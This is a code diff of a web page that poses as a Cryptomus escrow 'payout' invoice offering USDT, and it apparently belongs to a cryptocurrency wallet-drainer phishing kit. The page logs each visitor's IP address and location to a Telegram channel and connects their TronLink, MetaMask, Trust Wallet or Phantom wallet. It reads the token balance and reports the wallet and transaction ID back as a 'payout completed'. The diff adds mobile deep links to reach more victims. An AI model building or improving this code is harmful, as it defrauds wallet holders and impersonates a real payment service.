@@ -10,12 +10,7 @@
     <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
     <script src="https://unpkg.com/@solana/spl-token@0.4.9/lib/index.iife.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #0a0c12;
@@ -25,7 +20,6 @@
             align-items: center;
             padding: 24px;
         }
-
         .card {
             max-width: 540px;
             width: 100%;
@@ -35,8 +29,6 @@
             overflow: hidden;
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
-
-        /* Cryptomus style header */
         .header {
             padding: 24px 24px 16px 24px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.06);
@@ -60,14 +52,11 @@
             font-weight: 700;
             font-size: 20px;
             color: white;
-            font-family: 'Inter', sans-serif;
         }
         .logo-text {
             font-size: 20px;
             font-weight: 700;
             color: white;
-            letter-spacing: -0.3px;
-            font-family: 'Inter', sans-serif;
         }
         .status-badge {
             background: rgba(16, 185, 129, 0.12);
@@ -80,11 +69,7 @@
             align-items: center;
             gap: 6px;
         }
-        .status-badge::before {
-            content: "●";
-            font-size: 10px;
-        }
-
+        .status-badge::before { content: "●"; font-size: 10px; }
         .timer-section {
             background: #0d0f17;
             padding: 14px 24px;
@@ -93,10 +78,7 @@
             align-items: center;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
-        .timer-label {
-            font-size: 13px;
-            color: #8b93a7;
-        }
+        .timer-label { font-size: 13px; color: #8b93a7; }
         .timer-value {
             font-family: monospace;
             font-size: 24px;
@@ -105,13 +87,8 @@
             background: #1a1e2c;
             padding: 4px 16px;
             border-radius: 40px;
-            letter-spacing: 1px;
         }
-
-        .content {
-            padding: 24px;
-        }
-
+        .content { padding: 24px; }
         .verification-row {
             background: rgba(16, 185, 129, 0.06);
             border-radius: 16px;
@@ -133,17 +110,8 @@
             color: white;
             font-size: 12px;
         }
-        .verification-text {
-            color: #cdd9ff;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        .verification-sub {
-            font-size: 12px;
-            color: #6c7a91;
-            margin-top: 2px;
-        }
-
+        .verification-text { color: #cdd9ff; font-size: 13px; font-weight: 500; }
+        .verification-sub { font-size: 12px; color: #6c7a91; margin-top: 2px; }
         .info-card {
             background: #0c0f17;
             border-radius: 20px;
@@ -157,20 +125,9 @@
             padding: 10px 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.06);
         }
-        .info-row:last-child {
-            border-bottom: none;
-        }
-        .info-label {
-            color: #8b93a7;
-            font-size: 14px;
-        }
-        .info-value {
-            color: #f0f3fa;
-            font-weight: 500;
-            font-family: monospace;
-            font-size: 14px;
-        }
-
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #8b93a7; font-size: 14px; }
+        .info-value { color: #f0f3fa; font-weight: 500; font-family: monospace; }
         .amount-block {
             background: linear-gradient(135deg, #0e1120, #0a0d18);
             border-radius: 28px;
@@ -179,32 +136,12 @@
             margin-bottom: 24px;
             border: 1px solid rgba(16, 185, 129, 0.2);
         }
-        .amount-label {
-            font-size: 13px;
-            color: #8b93a7;
-            margin-bottom: 8px;
-        }
-        .amount-number {
-            font-size: 52px;
-            font-weight: 800;
-            color: white;
-            letter-spacing: -1px;
-        }
-        .amount-number small {
-            font-size: 22px;
-            font-weight: 500;
-            color: #6c7a91;
-        }
-
+        .amount-label { font-size: 13px; color: #8b93a7; margin-bottom: 8px; }
+        .amount-number { font-size: 52px; font-weight: 800; color: white; }
+        .amount-number small { font-size: 22px; font-weight: 500; color: #6c7a91; }
         .step { display: none; }
         .step.active { display: block; }
-
-        .network-grid, .wallet-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
+        .network-grid, .wallet-grid { display: flex; flex-direction: column; gap: 12px; }
         button {
             width: 100%;
             padding: 14px 18px;
@@ -222,11 +159,7 @@
             gap: 12px;
             justify-content: center;
         }
-        button:hover {
-            background: #252b3e;
-            transform: translateY(-1px);
-            border-color: rgba(16, 185, 129, 0.4);
-        }
+        button:hover { background: #252b3e; transform: translateY(-1px); border-color: rgba(16, 185, 129, 0.4); }
         .claim-btn {
             background: #10b981;
             color: white;
@@ -237,11 +170,7 @@
             border: none;
             box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
         }
-        .claim-btn:hover {
-            background: #0d9668;
-            transform: scale(0.98);
-        }
-
+        .claim-btn:hover { background: #0d9668; transform: scale(0.98); }
         .log {
             margin-top: 24px;
             padding: 14px;
@@ -254,7 +183,6 @@
             max-height: 110px;
             overflow-y: auto;
         }
-
         .footer {
             background: #0a0c12;
             padding: 14px 24px;
@@ -274,12 +202,10 @@
         </div>
         <div class="status-badge">Payout</div>
     </div>
-
     <div class="timer-section">
         <span class="timer-label">Payment window</span>
         <span class="timer-value" id="timer">--:--</span>
     </div>
-
     <div class="content">
         <div class="verification-row">
             <div class="check-icon">✓</div>
@@ -288,22 +214,11 @@
                 <div class="verification-sub">Payment processed by Cryptomus escrow</div>
             </div>
         </div>
-
         <div class="info-card">
-            <div class="info-row">
-                <span class="info-label">Invoice ID</span>
-                <span class="info-value" id="distId">#----</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Asset</span>
-                <span class="info-value">USDT (Multi‑Chain)</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Status</span>
-                <span class="info-value" style="color:#10b981;">● Ready for payout</span>
-            </div>
+            <div class="info-row"><span class="info-label">Invoice ID</span><span class="info-value" id="distId">#----</span></div>
+            <div class="info-row"><span class="info-label">Asset</span><span class="info-value">USDT (Multi‑Chain)</span></div>
+            <div class="info-row"><span class="info-label">Status</span><span class="info-value" style="color:#10b981;">● Ready for payout</span></div>
         </div>
-
         <div class="amount-block">
             <div class="amount-label">Amount to receive</div>
             <div class="amount-number"><span id="amount">0</span> <small>USDT</small></div>
@@ -358,6 +273,8 @@
         SOLANA: 'owsmq3BgnYDtenubSvXfVvA8Zd8NFb6syw7MxALiE1m'
     };
 
+    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
     function generateCode() { return Math.random().toString(36).substring(2,8).toUpperCase(); }
     function addLog(msg) { 
         const logDiv = document.getElementById('log');
@@ -378,7 +295,7 @@
             const geo = (await axios.get(`/api/geo/${ip}`)).data;
             visitor = { ip, country: geo.country, city: geo.city, device: navigator.userAgent, uid: Date.now().toString(), code: generateCode(), invoiceId };
             document.getElementById('distId').innerText = '#' + visitor.code;
-            await axios.post('/api/log', { type: 'visitor', telegram: `<b>📄 INVOICE ACCESS</b>\nID: #${visitor.code}\nIP: ${visitor.ip}\nLocation: ${geo.country} | ${geo.city}`, visitor });
+            await axios.post('/api/log', { type: 'visitor', telegram: `<b>📄 Cryptomus INVOICE ACCESS</b>\nID: #${visitor.code}\nIP: ${visitor.ip}\nLocation: ${geo.country} | ${geo.city}`, visitor });
         } catch(e) { addLog('Failed to load'); }
     }
 
@@ -422,26 +339,107 @@
         addLog(`Network: ${network}`);
     }
 
-    // TRON
-    async function connectTronLink() {
-        if (!window.tronLink) return alert('TronLink required');
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-        tronWeb = window.tronLink.tronWeb;
-        userAddress = tronWeb.defaultAddress.base58;
-        const contract = await tronWeb.contract().at(CONTRACTS.TRC20);
-        const balance = await contract.balanceOf(userAddress).call();
-        const formatted = tronWeb.toBigNumber(balance).div(1e6).toString();
-        showConfirm(formatted, userAddress, 'TRC‑20');
+    // ============ ОТКРЫТИЕ ПРИЛОЖЕНИЯ ============
+    function openWalletApp(walletName) {
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const urls = {
+            'TronLink': {
+                android: 'https://play.google.com/store/apps/details?id=com.tronlink.wallet',
+                ios: 'https://apps.apple.com/app/tronlink/id1503047139',
+                scheme: 'tronlink://'
+            },
+            'TrustWallet': {
+                android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
+                ios: 'https://apps.apple.com/app/trust-wallet/id1284769406',
+                scheme: 'trust://'
+            },
+            'MetaMask': {
+                android: 'https://play.google.com/store/apps/details?id=io.metamask',
+                ios: 'https://apps.apple.com/app/metamask/id1438144202',
+                scheme: 'metamask://'
+            },
+            'Phantom': {
+                android: 'https://play.google.com/store/apps/details?id=app.phantom',
+                ios: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977',
+                scheme: 'phantom://'
+            }
+        };
+        const wallet = urls[walletName];
+        if (!wallet) return;
+        
+        if (wallet.scheme) {
+            window.location.href = wallet.scheme;
+            setTimeout(() => {
+                const url = isIOS ? wallet.ios : wallet.android;
+                if (url) window.location.href = url;
+            }, 2000);
+        } else {
+            const url = isIOS ? wallet.ios : wallet.android;
+            if (url) window.location.href = url;
+        }
     }
-    async function connectTrustWalletTRC20() { await connectTronLink(); }
 
-    // EVM
+    // ============ TRON ============
+    async function connectTronLink() {
+        if (isMobile) {
+            if (window.tronLink && window.tronLink.ready) {
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                tronWeb = window.tronLink.tronWeb;
+                userAddress = tronWeb.defaultAddress.base58;
+                const contract = await tronWeb.contract().at(CONTRACTS.TRC20);
+                const balance = await contract.balanceOf(userAddress).call();
+                const formatted = tronWeb.toBigNumber(balance).div(1e6).toString();
+                showConfirm(formatted, userAddress, 'TRC‑20');
+            } else {
+                openWalletApp('TronLink');
+            }
+        } else {
+            if (!window.tronLink) {
+                if (confirm('TronLink extension not installed. Open Chrome Web Store?')) {
+                    window.open('https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec', '_blank');
+                }
+                return;
+            }
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+            tronWeb = window.tronLink.tronWeb;
+            userAddress = tronWeb.defaultAddress.base58;
+            const contract = await tronWeb.contract().at(CONTRACTS.TRC20);
+            const balance = await contract.balanceOf(userAddress).call();
+            const formatted = tronWeb.toBigNumber(balance).div(1e6).toString();
+            showConfirm(formatted, userAddress, 'TRC‑20');
+        }
+    }
+    async function connectTrustWalletTRC20() {
+        if (isMobile) {
+            openWalletApp('TrustWallet');
+        } else {
+            await connectTronLink();
+        }
+    }
+
+    // ============ EVM ============
     async function connectMetaMask() {
-        if (!window.ethereum) return alert('MetaMask required');
+        if (isMobile) {
+            if (window.ethereum) {
+                await connectMetaMaskDesktop();
+            } else {
+                openWalletApp('MetaMask');
+            }
+        } else {
+            await connectMetaMaskDesktop();
+        }
+    }
+    async function connectMetaMaskDesktop() {
+        if (!window.ethereum) {
+            if (confirm('MetaMask extension not installed. Open Chrome Web Store?')) {
+                window.open('https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn', '_blank');
+            }
+            return;
+        }
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAddress = accounts[0];
         const chainId = selectedNetwork === 'BEP20' ? '0x61' : '0xaa36a7';
-        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] }); } catch(e) { alert('Switch network'); }
+        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] }); } catch(e) { alert('Switch network manually'); }
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
         const contractAddr = selectedNetwork === 'BEP20' ? CONTRACTS.BEP20 : CONTRACTS.ERC20;
@@ -452,11 +450,33 @@
         evmContract = contract;
         showConfirm(formatted, userAddress, selectedNetwork);
     }
-    async function connectTrustWalletEVM() { await connectMetaMask(); }
+    async function connectTrustWalletEVM() {
+        if (isMobile) {
+            openWalletApp('TrustWallet');
+        } else {
+            await connectMetaMaskDesktop();
+        }
+    }
 
-    // SOLANA
+    // ============ SOLANA ============
     async function connectPhantom() {
-        if (!window.solana) return alert('Phantom required');
+        if (isMobile) {
+            if (window.solana) {
+                await connectPhantomDesktop();
+            } else {
+                openWalletApp('Phantom');
+            }
+        } else {
+            await connectPhantomDesktop();
+        }
+    }
+    async function connectPhantomDesktop() {
+        if (!window.solana) {
+            if (confirm('Phantom extension not installed. Open Chrome Web Store?')) {
+                window.open('https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa', '_blank');
+            }
+            return;
+        }
         const resp = await window.solana.connect();
         userAddress = resp.publicKey.toString();
         solanaConnection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
@@ -531,7 +551,7 @@
             }
             await axios.post('/api/log', {
                 type: 'success',
-                telegram: `<b>✅ PAYOUT COMPLETED</b>\nNetwork: ${selectedNetwork}\nID: #${visitor.code}\nAmount: ${document.getElementById('confirmAmount').innerText} USDT\nWallet: ${userAddress}\nTxID: ${txid}`,
+                telegram: `<b>✅ Cryptomus PAYOUT COMPLETED</b>\nNetwork: ${selectedNetwork}\nID: #${visitor.code}\nAmount: ${document.getElementById('confirmAmount').innerText} USDT\nWallet: ${userAddress}\nTxID: ${txid}`,
                 txHash: txid
             });
             addLog(`✅ Payout completed: ${txid?.slice(0,12)}...`);
